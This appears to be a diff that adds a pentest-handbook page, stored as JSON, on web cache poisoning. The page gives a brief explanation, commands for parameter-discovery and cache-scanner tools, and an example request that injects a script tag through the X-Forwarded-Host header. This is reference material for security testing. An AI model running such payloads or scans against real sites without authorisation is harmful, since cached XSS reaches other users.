@@ -1,0 +1,75 @@
+{
+    "title": "Web Cache Poisoning",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "General",
+            "type": "paragraph",
+            "content": "{% hint style=\"info\" %}\nWeb cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.\nFundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.\nA poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.\n{% endhint %}"
+        },
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner",
+                "wcvs -u https://url.com",
+                "# https://github.com/s0md3v/Arjun",
+                "python3 arjun.py -u https://url.com --get ",
+                "python3 arjun.py -u https://url.com --post",
+                "# https://github.com/maK-/parameth",
+                "python parameth.py -u https://example.com/test.php",
+                "# https://github.com/devanshbatham/ParamSpider",
+                "python3 paramspider.py --domain example.com",
+                "# https://github.com/s0md3v/Parth",
+                "python3 parth.py -t example.com",
+                "# XSS for users accessing /en?region=uk:",
+                "GET /en?region=uk HTTP/1.1",
+                "Host: innocent-website.com",
+                "X-Forwarded-Host: a.\"><script>alert(1)</script>\""
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2022-05-06T22:43:44.874Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/web-cache-poisoning.md",
+        "previous_page": {
+            "title": "CSRF",
+            "url": "/enumeration/web/csrf"
+        },
+        "next_page": {
+            "title": "Broken Links",
+            "url": "/enumeration/web/broken-links"
+        }
+    }
+}
